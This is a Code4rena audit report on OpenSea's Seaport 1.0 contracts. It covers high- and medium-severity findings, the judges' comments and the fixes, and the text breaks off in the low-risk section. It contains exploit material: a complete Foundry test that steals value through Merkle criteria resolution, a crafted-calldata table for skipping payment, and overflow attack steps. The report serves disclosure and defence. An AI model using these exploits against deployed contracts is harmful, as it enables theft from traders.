 1. sashik&#95;eth\n  1. [kaden](https://twitter.com/0xKaden)\n  1. sach1r0\n  1. [TomJ](https://mobile.twitter.com/tomj_bb)\n  1. [ellahi](https://twitter.com/ellahinator)\n  1. TerrierLover\n  1. asutorufos\n  1. delfin454000\n  1. hake\n  1. RoiEvenHaim\n  1. [Tadashi](https://github.com/htadashi)\n\nThis contest was judged by [0xleastwood](https://twitter.com/liam_eastwood13) and [HardlyDifficult](https://twitter.com/HardlyDifficult). Additional judging assistance provided by [Alex the Entreprenerd](https://twitter.com/GalloDaSballo) for reports detailing low risk and non-critical issues.\n\nFinal report assembled by [liveactionllama](https://twitter.com/liveactionllama).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 4 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 2 received a risk rating in the category of MEDIUM severity. Per OpenSea, all of these HIGH and MEDIUM severity findings have been addressed via Seaport 1.1. (see specific mitigations linked on each finding in the sections below)\n\nAdditionally, C4 analysis included 29 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 45 reports recommending gas optimizations.\n\nAll of the issues presented here are linked back to their original finding.\n\n# Scope\n\nSeaport 1.0 was the focus of this audit contest. The code under review can be found within the [C4 OpenSea Seaport contest repository](https://github.com/code-423n4/2022-05-opensea-seaport), and is composed of 44 smart contracts written in the Solidity programming language and includes 9,771 lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com).\n\n# High Risk Findings (2)\n## [[H-01] Truncation in `OrderValidator` can lead to resetting the fill and selling more tokens](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77)\n*Submitted by Spearbit, also found by 0xsanson, broccoli, cmichel, hyh, ming, OriDabush, Saw-mon&#95;and&#95;Natalie, and Yarpo*\n\n[OrderValidator.sol#L228](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L228)<br>\n[OrderValidator.sol#L231](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L231)<br>\n[OrderValidator.sol#L237](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L237)<br>\n[OrderValidator.sol#L238](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L238)<br>\n\nA partial order's fractions (`numerator` and `denominator`) can be reset to `0` due to a truncation. This can be used to craft malicious orders:\n\n1.  Consider user Alice, who has 100 ERC1155 tokens, who approved all of their tokens to the `marketplaceContract`.\n2.  Alice places a `PARTIAL_OPEN` order with 10 ERC1155 tokens and consideration of ETH.\n3.  Malory tries to fill the order in the following way:\n    1.  Malory tries to fill 50% of the order, but instead of providing the fraction `1 / 2`, Bob provides `2**118 / 2**119`. This sets the `totalFilled` to `2**118` and `totalSize` to `2**119`.\n    2.  Malory tries to fill 10% of the order, by providing `1 / 10`. The computation `2**118 / 2**119 + 1 / 10` is done by \"cross multiplying\" the denominators, leading to the acutal fraction being `numerator = (2**118 * 10 + 2**119)` and `denominator = 2**119 * 10`.\n    3.  Because of the `uint120` truncation in [OrderValidator.sol#L228-L248](https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/OrderValidator.sol#L228-L248), the `numerator` and `denominator` are truncated to `0` and `0` respectively.\n    4.  Bob can now continue filling the order and draining any approved (1000 tokens in total) of the above ERC1155 tokens, for the same consideration amount!\n\n### Proof of Concept\n\nView [full POC](https://gist.github.com/hrkrshnn/7c51b23f7c43c55ba0f8157c3b298409).\n\nThe following change would make the above POC fail:\n\n```diff\nmodified   contracts/lib/OrderValidator.sol\n@@ -225,6 +225,8 @@ contract OrderValidator is Executor, ZoneInteraction {\n                 // Update order status and fill amount, packing struct values.\n                 _orderStatus[orderHash].isValidated = true;\n                 _orderStatus[orderHash].isCancelled = false;\n+                require(filledNumerator + numerator <= type(uint120).max, \"overflow\");\n+                require(denominator <= type(uint120).max, \"overflow\");\n                 _orderStatus[orderHash].numerator = uint120(\n                     filledNumerator + numerator\n                 );\n@@ -234,6 +236,8 @@ contract OrderValidator is Executor, ZoneInteraction {\n             // Update order status and fill amount, packing struct values.\n             _orderStatus[orderHash].isValidated = true;\n             _orderStatus[orderHash].isCancelled = false;\n+            require(numerator <= type(uint120).max, \"overflow\");\n+            require(denominator <= type(uint120).max, \"overflow\");\n             _orderStatus[orderHash].numerator = uint120(numerator);\n             _orderStatus[orderHash].denominator = uint120(denominator);\n         }\n```\n\n### Recommended Mitigation Steps\n\nA basic fix for this would involve adding the above checks for overflow / truncation and reverting in that case. However, we think the mechanism is still flawed in some respects and requires more changes to fully fix it. See a related issue: [\"A malicious filler can fill a partial order in such a way that the rest cannot be filled by anyone\"](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/101) that points out a related but a more fundamental issue with the mechanism.\n\n**[0age (OpenSea) confirmed](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77#issuecomment-1162425341):**\n > I've identified that this issue and all of its duplicates clearly outline how an attacker might overflow an order to continually fulfill an order at the same market price.\n> \n> An instance where this issue might cause issues is during a restricted token sale. A relevant scenario is detailed as follows:\n>  - A new token is created and the owner wishes to sell 50% of the token supply to the public.\n>  - Because of an edge case in `OrderValidator`, the order fulfillment can be reset to allow the public to more than 50% of the total token supply.\n>  - As a result, allocations intended to be distributed to investors and the team, will no longer be available.\n>  - It is important to note, that additional tokens will be sold at the intended market price listed by the original order.\n> \n> For these reasons, I believe this issue to be of high severity because it breaks certain trust assumptions made by the protocol and its userbase. By intentionally forcing a user to sell additional tokens, you are effectively altering the allocation of their wallet holdings, potentially leading to further funds loss as they may incur slippage when they have to sell these tokens back.\n> \n> A great finding from all involved!\n\n**[0age (OpenSea) resolved](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77):**\n > PR: [ProjectOpenSea/seaport#319](https://github.com/ProjectOpenSea/seaport/pull/319)\n\n\n\n***\n\n## [[H-02] `_aggregateValidFulfillmentOfferItems()` can be tricked to accept invalid inputs](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75)\n*Submitted by Spearbit, also found by Saw-mon&#95;and&#95;Natalie*\n\n[FulfillmentApplier.sol#L406](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L406)<br>\n\nThe `_aggregateValidFulfillmentOfferItems()` function aims to revert on orders with zero value or where a total consideration amount overflows. Internally this is accomplished by having a temporary variable `errorBuffer`, accumulating issues found, and only reverting once all the items are processed in case there was a problem found. This code is optimistic for valid inputs.\n\nNote: there is a similar issue in `_aggregateValidFulfillmentConsiderationItems()`, which is reported separately.\n\nThe problem lies in how this `errorBuffer` is updated:\n\n```solidity\n                // Update error buffer (1 = zero amount, 2 = overflow).\n                errorBuffer := or(\n                  errorBuffer,\n                  or(\n                    shl(1, lt(newAmount, amount)),\n                    iszero(mload(amountPtr))\n                  )\n                )\n```\n\nThe final error handling code:\n\n```solidity\n            // Determine if an error code is contained in the error buffer.\n            switch errorBuffer\n            case 1 {\n                // Store the MissingItemAmount error signature.\n                mstore(0, MissingItemAmount_error_signature)\n\n                // Return, supplying MissingItemAmount signature.\n                revert(0, MissingItemAmount_error_len)\n            }\n            case 2 {\n                // If the sum overflowed, panic.\n                throwOverflow()\n            }\n```\n\nWhile the expected value is `0` (success),  `1` or `2` (failure), it is possible to set it to `3`, which is unhandled and considered as a \"success\". This can be easily accomplished by having both an overflowing item and a zero item in the order list.\n\nThis validation error could lead to fulfilling an order with a consideration (potentially \\~0) lower than expected.\n\n### Proof of Concept\n\nCraft an offer containing two errors (e.g. with  zero amount and overflow).<br>\nCall `matchOrders()`. Via calls to `_matchAdvancedOrders()`, `_fulfillAdvancedOrders()`, `_applyFulfillment()`, `_aggregateValidFulfillmentOfferItems()` will be called.<br>\nThe `errorBuffer` will get a value of 3  (the `or` of 1 and 2).<br>\nAs the value of 3 is not detected, no error will be thrown and the order will be executed, including the mal formed values.\n\n### Recommended Mitigation Steps\n\n1.  Change the check on [FulfillmentApplier.sol#L465](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L465)  to consider `case 3`.\n2.  Potential option: Introduce an early abort in case `errorBuffer != 0` on [FulfillmentApplier.sol#L338](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L338)\n\n**[0age (OpenSea) confirmed](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75)**\n\n**[HardlyDifficult (judge) decreased severity to Medium](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75)**\n\n**[cmichel (warden) commented](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75#issuecomment-1172848110):**\n > > This validation error could lead to fulfilling an order with a consideration (potentially ~0) lower than expected.\n> \n> That's correct, you can use this to fulfill an order essentially for free, that's why I'd consider this high severity.\n> They could have done a better job demonstrating it with a POC test case but this sentence imo shows that they were aware of the impact.\n> \n> See [this test case](https://github.com/ProjectOpenSea/seaport/blob/5c6a628cb152d731e956682dd748d30e8bf1f1c9/test/findings/FulfillmentOverflowWithMissingItems.spec.ts#L136) showing how to buy an NFT for 1 DAI instead of 1000 DAI.\n\n**0age (OpenSea) disagreed with Medium severity:**\n > This is the highest-severity finding. If it were me, I'd switch this to high.\n\n**[HardlyDifficult (judge) increased severity to High](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75#issuecomment-1183115107):**\n > After further consideration and discussion with @HardlyDifficult, we agree with @cmichel that this should be of high severity. As the protocol allows for invalid orders to be created, users aware of this vulnerability will be able to fulfill an order at a considerable discount. This fits the criteria of a high severity issue as it directly leads to lost funds.\n\n**[0age (OpenSea) resolved](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75):**\n > PR: [ProjectOpenSea/seaport#320](https://github.com/ProjectOpenSea/seaport/pull/320)\n\n\n\n***\n\n \n# Medium Risk Findings (2)\n## [[M-01] Merkle Tree criteria can be resolved by wrong tokenIDs](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168)\n_Submitted by cmichel, also found by frangio and Spearbit_\n\n[CriteriaResolution.sol#L157](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L157)<br>\n\nThe protocol allows specifying several tokenIds to accept for a single offer.<br>\nA merkle tree is created out of these tokenIds and the root is stored as the `identifierOrCriteria` for the item.<br>\nThe fulfiller then submits the actual tokenId and a proof that this tokenId is part of the merkle tree.<br>\n\nThere are no real verifications on the merkle proof that the supplied tokenId is indeed **a leaf of the merkle tree**.<br>\nIt's possible to submit an intermediate hash of the merkle tree as the tokenId and trade this NFT instead of one of the requested ones.<br>\n\nThis leads to losses for the offerer as they receive a tokenId that they did not specify in the criteria.<br>\nUsually, this criteria functionality is used to specify tokenIds with certain traits that are highly valuable. The offerer receives a low-value token that does not have these traits.\n\n### Example\n\nAlice wants to buy either NFT with tokenId 1 or tokenId 2.<br>\nShe creates a merkle tree of it and the root is `hash(1||2) = 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0`.<br>\nShe creates an offer for this criteria.<br>\nAn attacker can now acquire the NFT with tokenId `0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0` (or, generally, any other intermediate hash value) and fulfill the trade.\n\n> One might argue that this attack is not feasible because the provided hash is random and tokenIds are generally a counter. However, this is not required in the standard.\n>\n> \"While some ERC-721 smart contracts may find it convenient to start with ID 0 and simply increment by one for each new NFT, callers SHALL NOT assume that ID numbers have any specific pattern to them, and MUST treat the ID as a 'black box'.\" [EIP721](https://eips.ethereum.org/EIPS/eip-721)\n>\n> Neither do the standard OpenZeppelin/Solmate implementations use a counter. They only provide internal `_mint(address to, uint256 id)` functions that allow specifying an arbitrary `id`. NFT contracts could let the user choose the token ID to mint, especially contracts that do not have any linked off-chain metadata like Uniswap LP positions.<br>\n> Therefore, ERC721-compliant token contracts are vulnerable to this attack.\n\n### Proof of Concept\n\nHere's a `forge` test ([gist](https://gist.github.com/MrToph/ccf5ec112b481e70dbf275aa0a3a02d6)) that shows the issue for the situation mentioned in *Example*.\n\n```solidity\ncontract BugMerkleTree is BaseOrderTest {\n    struct Context {\n        ConsiderationInterface consideration;\n        bytes32 tokenCriteria;\n        uint256 paymentAmount;\n        address zone;\n        bytes32 zoneHash;\n        uint256 salt;\n    }\n\n    function hashHashes(bytes32 hash1, bytes32 hash2)\n        internal\n        returns (bytes32)\n    {\n        // see MerkleProof.verify\n        bytes memory encoding;\n        if (hash1 <= hash2) {\n            encoding = abi.encodePacked(hash1, hash2);\n        } else {\n            encoding = abi.encodePacked(hash2, hash1);\n        }\n        return keccak256(encoding);\n    }\n\n    function testMerkleTreeBug() public resetTokenBalancesBetweenRuns {\n        // Alice wants to buy NFT ID 1 or 2 for token1. compute merkle tree\n        bytes32 leafLeft = bytes32(uint256(1));\n        bytes32 leafRight = bytes32(uint256(2));\n        bytes32 merkleRoot = hashHashes(leafLeft, leafRight);\n        console.logBytes32(merkleRoot);\n\n        Context memory context = Context(\n            consideration,\n            merkleRoot, /* tokenCriteria */\n            1e18, /* paymentAmount */\n            address(0), /* zone */\n            bytes32(0), /* zoneHash */\n            uint256(0) /* salt */\n        );\n        bytes32 conduitKey = bytes32(0);\n\n        token1.mint(address(alice), context.paymentAmount);\n        // @audit assume there's a token where anyone can acquire IDs. smaller IDs are more valuable\n        // we acquire the merkle root ID\n        test721_1.mint(address(this), uint256(merkleRoot));\n\n        _configureERC20OfferItem(\n            // start, end\n            context.paymentAmount, context.paymentAmount\n        );\n        _configureConsiderationItem(\n            ItemType.ERC721_WITH_CRITERIA,\n            address(test721_1),\n            // @audit set merkle root for NFTs we want to accept\n            uint256(context.tokenCriteria), /* identifierOrCriteria */\n            1,\n            1,\n            alice\n        );\n\n        OrderParameters memory orderParameters = OrderParameters(\n            address(alice),\n            context.zone,\n            offerItems,\n            considerationItems,\n            OrderType.FULL_OPEN,\n            block.timestamp,\n            block.timestamp + 1000,\n            context.zoneHash,\n            context.salt,\n            conduitKey,\n            considerationItems.length\n        );\n\n        OrderComponents memory orderComponents = getOrderComponents(\n            orderParameters,\n            context.consideration.getNonce(alice)\n        );\n        bytes32 orderHash = context.consideration.getOrderHash(orderComponents);\n        bytes memory signature = signOrder(\n            context.consideration,\n            alicePk,\n            orderHash\n        );\n\n        delete offerItems;\n        delete considerationItems;\n\n        /*************** ATTACK STARTS HERE ***************/\n        AdvancedOrder memory advancedOrder = AdvancedOrder(\n            orderParameters,\n            1, /* numerator */\n            1, /* denominator */\n            signature,\n            \"\"\n        );\n\n        // resolve the merkle root token ID itself\n        CriteriaResolver[] memory cr = new CriteriaResolver[](1);\n        bytes32[] memory proof = new bytes32[](0);\n        cr[0] = CriteriaResolver(\n              0, // uint256 orderIndex;\n              Side.CONSIDERATION, // Side side;\n              0, // uint256 index; (item)\n              uint256(merkleRoot), // uint256 identifier;\n              proof // bytes32[] criteriaProof;\n        );\n\n        uint256 profit = token1.balanceOf(address(this));\n        context.consideration.fulfillAdvancedOrder{\n            value: context.paymentAmount\n        }(advancedOrder, cr, bytes32(0));\n        profit = token1.balanceOf(address(this)) - profit;\n\n        // @audit could fulfill order without owning NFT 1 or 2\n        assertEq(profit, context.paymentAmount);\n    }\n}\n```\n\n### Recommended Mitigation Steps\n\nUsually, this is fixed by using a type-byte that indicates if one is computing the hash for a *leaf* or not.<br>\nAn elegant fix here is to simply [use hashes of the tokenIds](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L250) as the leaves - instead of the tokenIds themselves. (Note that this is the natural way to compute merkle trees if the data size is not already the hash size.)<br>\nThen compute the leaf hash in the contract from the provided tokenId:\n\n```diff\nfunction _verifyProof(\n    uint256 leaf,\n    uint256 root,\n    bytes32[] memory proof\n) internal pure {\n    bool isValid;\n\n-    assembly {\n-        let computedHash := leaf\n+  bytes32 computedHash = keccak256(abi.encodePacked(leaf))\n  ...\n```\n\nThere can't be a collision between a leaf hash and an intermediate hash anymore as the former is the result of hashing 32 bytes, while the latter are the results of hashing 64 bytes.\n\nNote that this requires off-chain changes to how the merkle tree is generated. (Leaves must be hashed first.)\n\n**[0age (OpenSea) confirmed, but disagreed with severity](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168)**\n\n**[HardlyDifficult (judge) decreased severity to Medium](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168#issuecomment-1163507934):**\n > The attack outlined by the warden showcases how an intermediate node of a proof can be used as leaves, potentially allowing the attacker to resolve the merkle tree to a different `tokenId`. I think in the majority of cases, this will not allow users to trade on invalid `tokenIds`, however, considering the `ERC721` specification does not enforce a standard for how NFTs are represented using `tokenIds`, the issue has some legitimacy. Because of this, I believe `medium` severity to be justified.\n\n**[0age (OpenSea) resolved](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168):**\n > PR: [ProjectOpenSea/seaport#316](https://github.com/ProjectOpenSea/seaport/pull/316)\n\n\n\n***\n\n## [[M-02] Wrong items length assertion in basic order](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/129)\n_Submitted by 0xsanson, also found by cmichel_\n\n[BasicOrderFulfiller.sol#L346-L349](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L346-L349)<br>\n\nWhen fulfilling a basic order we need to assert that the parameter `totalOriginalAdditionalRecipients` is less or equal than the length of `additionalRecipients` written in calldata.<br>\nHowever in `_prepareBasicFulfillmentFromCalldata` this assertion is incorrect [(L346)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L346-L349):\n\n```js\n        // Ensure supplied consideration array length is not less than original.\n        _assertConsiderationLengthIsNotLessThanOriginalConsiderationLength(\n            parameters.additionalRecipients.length + 1,\n            parameters.totalOriginalAdditionalRecipients\n        );\n```\n\nThe way the function is written ([L75](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/Assertions.sol#L75-L83)), it accepts also a length smaller than the original by 1 (basically there shouldn't be a `+ 1` in the first argument).\n\nInterestingly enough, in the case `additionalRecipients.length < totalOriginalAdditionalRecipients`, the inline-assembly for-loop at [(L506)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L506) will read consideration items out-of-bounds.<br>\nThis can be a vector of exploits, as illustrated below.\n\n### Proof of Concept\n\nAlice makes the following offer: a basic order, with two `considerationItem`s. The second item has the following data:\n\n```js\nconsideration[1] = {\n\titemType: ...,\n\ttoken: ...,\n\tidentifierOrCriteria: ...,\n\tstartAmount: X,\n\tendAmount: X,\n\trecipient: Y,\n}\n```\n\nThe only quantities we need to track are the amounts `X` and recipient `Y`.\n\nWhen fulfilling the order normally, the fulfiller will spend `X` tokens sending them to `Y`. It's possible however to exploit the previous bug in a way that the fulfiller won't need to make this transfer.\n\nTo do this, the fulfiller needs to craft the following calldata:\n\n| calldata pointer |   correct calldata   |   exploit calldata  |\n| ---------------: | :------------------: | :-----------------: |\n|              ... |          ...         |         ...         |\n|            0x204 |   1 (tot original)   |   1 (tot original)  |\n|            0x224 |  0x240 (head addRec) | 0x240 (head addRec) |\n|            0x244 |   0x2a0 (head sign)  |  0x260 (head sign)  |\n|            0x264 |   1 (length addRec)  |  0 (length addRec)  |\n|            0x284 |      X (amount)      |   X (length sign)   |\n|            0x2a4 |     Y (recipient)    |    Y (sign body)    |\n|            0x2c4 |  0x40 (length sign)  |   0x00 (sign body)  |\n|            0x2e4 | [correct Alice sign] |         ...         |\n|            0x304 | [correct Alice sign] |         ...         |\n|                  |                      |                     |\n\nBasically writing `additionalRecipients = []` and making the signature length = `X`, with `Y` being the first 32 bytes.\nOf course this signature will be invalid; however it doesn't matter since the exploiter can call `validate` with the correct signature beforehand.\n\nThe transaction trace will look like this:\n\n*   the assertion `_assertConsiderationLengthIsNotLessThanOriginalConsiderationLength` passes;\n*   the `orderHash` calculated is the correct one, since the for-loop over original consideration items picks up calldata at pointers {0x284, 0x2a4} [(L513)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L513-L550);\n*   the order was already validated beforehand, so the signature isn't read;\n*   at the end, during the tokens transfers, only `offer` and `consideration[0]` are transferred, since the code looks at `additionalRecipients` which is empty.\n\nConclusion:\n\nEvery Order that is \"basic\" and has two or more consideration items can be fulfilled in a way to not trade the *last* consideration item in the list. The fulfiller spends less then normally, and a recipient doesn't get his due.\n\nThere's also an extra requirement which is stricter: this last item's `startAmount` (= endAmount) needs to be smallish (< 1e6). This is because this number becomes the signature bytes length, and we need to fill the calldata with extra zeroes to complete it. Realistically then the exploit will work only if the item is a ERC20 will low decimals.\n\nI've made a hardhat test that exemplifies the exploit. [(Link to gist)](https://gist.github.com/0xsanson/e87e5fe26665c6cecaef2d9c4b0d53f4)\n\n### Recommended Mitigation Steps\n\nRemove the `+1` at L347.\n\n**[0age (OpenSea) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/129#issuecomment-1146181371):**\n > Valid finding on the off-by-one error, this was already reported to us outside of c4 and we're going to fix — will mention that it's very difficult to find / craft exploitable payloads though, so severity should be lower.\n\n**[HardlyDifficult (judge) decreased severity to Medium](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/129)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/129#issuecomment-1164660284):**\n > While the issue outlines an exploit whereby an attacker can fulfill an order without paying the entire consideration amount, it does require a set of requirements, namely:\n>  - The item is an ERC20 with low decimals.\n>  - The order has `considerationItems > 1`.\n> \n> Maximum extractable value for the most prevalent ERC20 token with low decimals, `WBTC`. This token uses 8 decimals and currently we know that calldata uses 16 gas for each byte used. Based on a block gas limit of `30,000,000`, we can deduce that the calldata length has an upper bound of `1.875` MB. Based on this, the maximum extractable value would be `(1,875,000 / 1e8) * $20,000 USD = $375 USD`, assuming the price for each `WBTC` is $20,000 USD.\n> \n> Relevant EIP detailing this is found at https://eips.ethereum.org/EIPS/eip-4488.\n> \n> It is also important to note, that by utilising the entire available block space on Ethereum, it is very likely that the cost of the transaction will far exceed the amount received in the attack.\n> \n> The attack does in fact leak value by allowing orders to be fulfilled at a slight discount. However, because this only affects very specific order types, I believe `medium` severity to be justified.\n> \n> > 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> \n> This was one of the most interesting issues I've read, kudos to those who found it!\n\n**[0age (OpenSea) resolved](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/129):**\n > PR: [ProjectOpenSea/seaport#317](https://github.com/ProjectOpenSea/seaport/pull/317)\n\n\n\n***\n\n# Low Risk and Non-Critical Issues\n\nFor this contest, 29 reports were submitted by wardens detailing low risk and non-critical issues. Many of these reports were integrated into Seaport 1.1, often by the warden themselves; see [this PR](https://github.com/ProjectOpenSea/seaport/pull/492/files) from OpenSea for the full set of changes.\n\nThe [report highlighted below](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/203) by team **Spearbit** received the top score from the judge.\n\n*The following wardens also submitted reports: [Saw-mon&#95;and&#95;Natalie](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/74), [cmichel](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/175), [IllIllI](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/145), [broccoli](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/150), [Chom](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/188), [sces60107](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/123), [zkhorse](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/143), [shung](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/113), [hack3r-0m](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/202), [peritoflores](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/189), [OriDabush](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/110), [hyh](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/213), [scaraven](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/131), [hickuphh3](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/41), [ilan](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/130), [cccz](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/65), [0xsanson](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/135), [csanuragjain](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/53), [kebabsec](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/163), [sorrynotsorry](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/106), [zzzitron](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/104), [oyc&#95;109](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/21), [twojoy](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/161), [tintin](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/90), [rfa](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/194), [foobar](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/212), [hubble](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/196), and [mayo](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/85).*\n\n## Table of Contents\n\n*   **[01]** The function `_name()` returns dirty data\n*   **[02]** `_revertWithReasonIfOneIsReturned`, `_doesNotMatchMagic` (and `_assertIsValidOrderStaticcallSuccess`) have a fragile dependency on call order\n*   **[03]** `_performERC1155BatchTransfers` consumes all gas on invalid input\n*   **[04]** Hardcoded values in `_validateAndFulfillBasicOrder()`\n*   **[05]** Helpers should have their expectations explained in NatSpec/comments\n*   **[06]** `ConduitTransfer` identifier field can be dirty and unused\n*   **[07]** Inconsistent way to return values in `_verifyTime()` and `_verifyOrderStatus`\n*   **[08]** `_callConduitUsingOffsets` depends on compiler behaviour for inter-assembly-block cleanup\n*   **[09]** `Assertions.sol` is missing an assertion about bounds for array length\n*   **[10]** LowLevelHelpers enforce a stricter ABI standard for `returndatasize`\n*   **[11]** `_assertValidSignature` allows malleable `secp256k1` signatures\n*   **[12]** The memory cost calculation logic `_revertWithReasonIfOneIsReturned` is duplicated in multiple places\n*   **[13]** Accumulator code depends on memory usage\n*   **[14]** Doing a basic order twice gives a misleading error message\n*   **[15]** Orders with moving price and `endTime = type(uint).max` can never be fulfilled\n*   **[16]** `_prepareBasicFulfillmentFromCalldata` overwrites memory extensively\n*   **[17]** Parameters passed to `fulfillBasicOrder()` insufficiently checked\n*   **[18]** `startAmount` and `endAmount` being different would severely limit partial orders \n*   **[19]** SafeTransferFrom: `transferFrom` to precompiles may succeed, a deviation from OZ's implementation\n*   **[20]** The gas computation for memory expansion rounds down instead of rounding up \n*   **[21]** `TokenTransferrer._performERC1155BatchTransfers` leaves corrupted memory\n*   **[22]** `_triggerIfArmed()` done outside of reentrancy guards\n*   **[23]** Deviations between Solidity compiler's checks and seaport's checks in `validateOrderParameters` \n\n## [01] The function `_name()` returns dirty data \n\n**Context:** [Seaport.sol#L41](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/Seaport.sol#L41), [ConsiderationBase.sol#L100](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/ConsiderationBase.sol#L100)\n\nThe function `name()` of Seaport.sol returns dirty data.<br>\nThis may create issues with frontends that expect clean data. In fact, Etherscan is having trouble decoding it!<br>\nhttps://etherscan.io/address/0x00000000006cee72100d161c57ada5bb2be1ca79#readContract and click name! There is a junk character at the end.<br>\n<img width=\"108\" alt=\"image\" src=\"https://user-images.githubusercontent.com/5469459/169769394-21818bb9-d85f-459d-b276-d4cdd190ee35.png\">\n\nThis also could have negative impact on composability.\n\nThe external function `name()` gets its value from `_name()` in contract Seaport.\n```solidity\ncontract ReferenceConsideration is ConsiderationInterface, ReferenceOrderCombiner {\n    ...\n    function name() external pure override returns (string memory contractName) {\n        contractName = _name();\n    }\n    ...\n}\n```\n```solidity\ncontract Seaport is Consideration {\n    ...\n    function _name() internal pure override returns (string memory) {\n        // Return the name of the contract.\n        assembly {\n            mstore(0, 0x20)\n            mstore(0x27, 0x07536561706f7274)\n            return(0, 0x60)\n        }\n    }\n}\n```\n \n\nFunction `_name()` is supposed to return \"Seaport\". The ABI encoded data has offset as the first 32 bytes (`0x20` 